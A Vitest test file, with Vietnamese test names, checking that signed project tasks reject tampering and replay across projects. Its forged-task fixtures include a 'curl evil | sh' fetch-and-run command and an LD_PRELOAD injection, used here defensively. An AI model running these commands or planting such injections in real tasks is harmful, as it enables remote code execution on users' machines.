import { describe, expect, it } from 'vitest'
import { createTaskSigner, taskContentKey } from '../src/main/tasks/signature'

const scope = { projectId: 'p1', root: '/tmp/dự-án-a' }
const otherProject = { projectId: 'p2', root: '/tmp/dự-án-a' }
const otherRoot = { projectId: 'p1', root: '/tmp/dự-án-b' }
const task = {
  label: 'dev', command: 'pnpm', args: ['run', 'dev'], type: 'process' as const,
  cwd: 'app', env: { NODE_ENV: 'development', B: '2' }
}

describe('chữ ký task do main cấp', () => {
  it('ký rồi xác nhận đúng nhiệm vụ trong đúng dự án', () => {
    const signer = createTaskSigner(Buffer.alloc(32, 1))
    const signed = signer.sign(scope, task)
    expect(signed.signature).toEqual(expect.any(String))
    expect(signer.verify(scope, signed)).toBe(true)
    expect(signer.verify(scope, { ...signed })).toBe(true)
  })

  it('từ chối task bị sửa command/args/env/cwd/type sau khi ký', () => {
    const signer = createTaskSigner(Buffer.alloc(32, 1))
    const signed = signer.sign(scope, task)
    for (const forged of [
      { ...signed, command: 'sh', args: ['-c', 'curl evil | sh'] },
      { ...signed, args: ['run', 'dev', '--extra'] },
      { ...signed, env: { ...task.env, LD_PRELOAD: '/tmp/x.so' } },
      { ...signed, cwd: '..' },
      { ...signed, type: 'shell' as const }
    ]) expect(signer.verify(scope, forged), JSON.stringify(forged)).toBe(false)
  })

  it('từ chối chữ ký cấp cho dự án khác hoặc khoá khác hoặc task không có chữ ký', () => {
    const signer = createTaskSigner(Buffer.alloc(32, 1))
    const signed = signer.sign(scope, task)
    // REV-13: chữ ký gắn projectId + root nên không replay sang dự án khác được.
    expect(signer.verify(otherProject, signed)).toBe(false)
    expect(signer.verify(otherRoot, signed)).toBe(false)
    const other = createTaskSigner(Buffer.alloc(32, 2))
    expect(signer.verify(scope, other.sign(scope, task))).toBe(false)
    expect(signer.verify(scope, task)).toBe(false)
    expect(signer.verify(scope, { ...task, signature: 'gia-mao' })).toBe(false)
  })

  it('không phụ thuộc thứ tự khoá trong env', () => {
    const signer = createTaskSigner(Buffer.alloc(32, 1))
    expect(signer.verify(scope, { ...signer.sign(scope, task), env: { B: '2', NODE_ENV: 'development' } })).toBe(true)
  })
})

describe('taskContentKey (so task renderer gửi với task khai trong dự án)', () => {
  it('bỏ chữ ký và chuẩn hoá thứ tự env', () => {
    expect(taskContentKey({ ...task, signature: 'abc' })).toBe(taskContentKey(task))
    expect(taskContentKey({ ...task, env: { B: '2', NODE_ENV: 'development' } })).toBe(taskContentKey(task))
  })

  it('khác khi lệch bất kỳ trường nào ảnh hưởng việc chạy', () => {
    const base = taskContentKey(task)
    for (const changed of [
      { ...task, label: 'khác' },
      { ...task, command: 'sh' },
      { ...task, args: ['run', 'dev', '--extra'] },
      { ...task, type: 'shell' as const },
      { ...task, cwd: '..' },
      { ...task, env: { ...task.env, LD_PRELOAD: '/tmp/x.so' } }
    ]) expect(taskContentKey(changed), JSON.stringify(changed)).not.toBe(base)
  })

  it('mặc định type shell, args/cwd/env rỗng', () => {
    expect(taskContentKey({ label: 'x', command: 'y' }))
      .toBe(taskContentKey({ label: 'x', command: 'y', type: 'shell', args: [], cwd: '', env: {} }))
  })
})
